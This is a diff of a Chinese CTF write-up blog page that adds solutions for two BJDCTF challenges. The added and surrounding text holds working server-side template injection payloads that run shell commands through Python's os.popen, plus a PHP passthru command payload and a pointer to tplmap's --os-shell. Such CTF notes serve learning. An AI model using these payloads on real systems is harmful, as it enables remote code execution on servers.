@@ -358,21 +358,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-10
+                    2021-03-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    2.7k
+                    2.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    11 分
+                    12 分
                 </div>
                 
 
@@ -681,11 +681,21 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 <p>这题随便传一个参数<code>?a=&#123;phpinfo()&#125;</code>发现可以执行成功</p>
 <p>审查代码发现过滤了exec和eval</p>
 <p>所以只能用passthru执行命令了<code>?a=&#123;passthru(&#39;tac /_21372&#39;)&#125;</code></p>
+<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093525180.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093620319.png"></p>
+<p>根据提示，可以试试修改X-Forwarded-For或者是client-ip，试了一下发现存在模板注入，直接调用系统命令就可以查看flag了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093807486.png"></p>
 <h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>常规套路，直接找到flag</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210310222204046.png"></p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.246.176:18056&#x2F;?flag&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[431].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat &#x2F;app&#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>存在XSS</p>
+<p>根据提示发现存在ssti漏洞</p>
+<p>payload:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用tplmap启动伪终端使用<code>--os-shell</code>直接查看flag</p>
 
                 
             </div>
@@ -1068,7 +1078,7 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.3k</span>&nbsp;字
+                class="white-color">42.4k</span>&nbsp;字
             
             
             
